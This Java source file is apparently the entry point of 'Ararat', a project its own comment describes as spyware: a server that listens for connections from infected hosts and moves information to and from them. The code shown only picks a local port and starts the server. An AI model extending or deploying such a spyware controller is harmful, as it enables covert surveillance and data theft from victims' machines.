package araratproject;

import java.io.IOException;

/**
 * Ararat is a Spyware project, that functions as an interface 
 * for the owner, listens for connections and handles the 
 * information transfered from and to the connected hosts.
 * 
 * @version 0.1
 * @author Andreas Demosthenous
 * @since 11/06/2020
 */
public class AraratProject {
    /**
     * 
     * @param args
     * @throws IOException
     */
    public static void main(String[] args) throws IOException {
        
        //Finding the server public IP
        
        String publicIP = "127.0.0.1";

        //Finding the First available port starting from 2000
        int tcpPort = Toolset.findAvailablePort(2000);
        if(tcpPort < 0 || tcpPort > 65535)tcpPort = -1;
        //Initilizing the Server     
        new Server(publicIP, tcpPort);

    }

}
